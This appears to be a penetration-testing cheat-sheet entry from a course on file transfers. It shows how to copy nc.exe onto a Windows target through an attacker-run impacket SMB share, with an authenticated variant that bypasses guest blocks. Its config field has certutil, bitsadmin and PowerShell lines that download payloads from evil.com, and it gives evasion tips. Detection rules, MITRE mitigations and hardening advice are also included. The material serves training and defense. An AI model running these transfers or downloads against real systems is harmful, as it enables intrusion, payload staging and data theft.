examples.label: CPTS Ch07 — serve /tmp/smbshare unauthenticated, copy nc.exe
examples.command:
# Attacker:
sudo impacket-smbserver share -smb2support /tmp/smbshare
# Target:
copy \\192.168.220.133\share\nc.exe

examples.label: Authenticated share (bypass guest block)
examples.command:
# Attacker:
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
# Target:
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe

notes: `impacket-smbserver share . -smb2support` on the attacker, then `copy \\<lhost>\share\file .` on Windows. Fast and native. Add `-user/-password` since Win10+ blocks guest SMB. Modern Windows blocks unauthenticated guest SMB access — add -user/-password when that error appears. Use 'net use' to mount share persistently. impacket-smbserver auto-handles SMBv2 with -smb2support. Also covered in: CPTS Ch07 (File Transfers).
name: Windows - SMB Transfer (Impacket)
description: Stand up an SMB server on your attack host, then map it and copy files from the Windows target. Add credentials if the target blocks unauthenticated guest SMB.

steps.label: 1. Start SMB server (attacker)
steps.command:
sudo impacket-smbserver share -smb2support /tmp/smbshare
# with auth: sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

steps.label: 2. Map + copy (target)
steps.command:
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
# or directly: copy \\192.168.220.133\share\nc.exe

defense.why_it_works: Copying files over SMB (e.g. from an attacker impacket smbserver) uses TCP 445, which enterprises frequently allow outbound even when HTTP/FTP are filtered - exactly the module scenario (445 allowed when 21 and web were blocked).
defense.prerequisites: Code execution on Windows, an attacker SMB share reachable on 445, and outbound 445 permitted.
defense.impact: Files moved on/off the target over an allowed channel - commonly used to stage privesc binaries or exfil sensitive data.
defense.detection: Outbound SMB (445) to a non-domain/external host is anomalous; new file on disk; the copy/net-use command line (4688 / Sysmon 1). SMB to an unknown server IP is a strong indicator.
defense.artifacts: An SMB session to the attacker IP on 445; the copied file; net use / copy command lines.
defense.prevention: [MITRE T1105 M1037] Block outbound 445 to non-internal hosts - SMB should never egress the perimeter - and segment/monitor internal SMB. [M1031] IDS/IPS on SMB file writes; EDR on the copy activity.
defense.evasion: SMB blends where 445 is broadly allowed internally; authenticate the share (impacket -user/-pass) so it resembles a normal file server; encrypt the payload before transfer.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering — block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'
